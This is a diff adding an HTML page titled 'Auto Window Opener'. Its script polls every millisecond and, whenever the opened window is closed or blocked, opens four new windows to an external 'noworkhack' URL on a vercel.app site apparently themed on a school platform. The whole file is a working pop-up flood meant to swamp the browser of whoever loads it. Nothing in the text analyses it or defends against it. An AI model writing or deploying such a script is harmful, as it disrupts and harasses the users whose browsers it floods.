@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Window Opener</title>
+</head>
+<body>
+    <script>
+        var win = window.open("secondwindow.html", "woo");
+
+        function pollWindow() {
+            try {
+                if (win == null || win.closed) {
+                    window.open("https://schoologyclasslinklol.vercel.app/noworkhack", "woo1");
+                    window.open("https://schoologyclasslinklol.vercel.app/noworkhack", "woo2");
+                    window.open("https://schoologyclasslinklol.vercel.app/noworkhack", "woo3");
+                    window.open("https://schoologyclasslinklol.vercel.app/noworkhack", "woo4");
+                }
+            } catch (e) {}
+        }
+
+        window.onload = function () {
+            setInterval(pollWindow, 1);
+        };
+    </script>
+</body>
+</html>
